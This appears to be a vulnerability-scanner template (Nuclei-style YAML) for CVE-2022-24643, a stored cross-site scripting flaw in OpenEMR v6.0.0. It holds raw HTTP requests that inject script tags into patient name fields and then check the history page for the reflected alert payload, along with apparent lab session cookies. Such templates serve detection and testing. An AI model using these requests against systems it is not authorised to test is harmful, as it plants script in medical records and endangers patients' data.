id: CVE-2022-24643

info:
  name: OpenEMR v6.0.0 Stored XSS Vulnerability
  author: Bartu Utku SARP
  severity: high
  description: OpenEMR v6.0.0 Stored XSS Vulnerability
  reference: https://securityforeveryone.com/blog/openemr-0-day-stored-cross-site-scripting-xss-vulnerability-cve-2022-24643
  tags: openemr,cve,cve2022,xss

requests:
  - raw:
      - |
        POST /openemr/interface/new/new_comprehensive_save.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 631
        Origin: http://192.168.231.145
        Connection: close
        Referer: http://192.168.231.145/openemr/interface/new/new.php
        Cookie: OpenEMR=d3WIi8cwboJzONM2NyB5qF1VSayGwiW%2C4lUyRZ7SdUvPNS7R; PHPSESSID=nbsvc3gf8n03m0lee9qm20aias
        Upgrade-Insecure-Requests: 1
        csrf_token_form=82c0f550f3a9ccb4c40016887d43b6bf6bb8e153&form_cb_1=1&form_title=Mr.&form_fname=%22%3E%3Cscript%3Ealert%28%22name1%22%29%3C%2Fscript%3E&form_mname=Asdasd%22%3E%3Cscript%3Ealert%28%22name2%22%29%3C%2Fscript%3E&form_lname=Asdasd%22%3E%3Cscript%3Ealert%28%22name3%22%29%3C%2Fscript%3E&form_pubpid=123123&form_DOB=2022-03-28&form_sex=Female&form_ss=123123&form_drivers_license=23123123&form_status=single&form_genericname1=123123&form_genericval1=13213&form_genericname2=213213&form_genericval2=213213&form_billing_note=213123&form_pharmacy_id=0&i1accept_assignment=TRUE&i2accept_assignment=TRUE&i3accept_assignment=TRUE

      - |
        GET /openemr/interface/patient_file/history/history_full.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Referer: http://192.168.231.145/openemr/interface/patient_file/history/history.php
        Cookie: OpenEMR=d3WIi8cwboJzONM2NyB5qF1VSayGwiW%2C4lUyRZ7SdUvPNS7R; PHPSESSID=nbsvc3gf8n03m0lee9qm20aias
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: word
        words:
          - <script>alert("name1")</script>
          - <script>alert("name3")</script>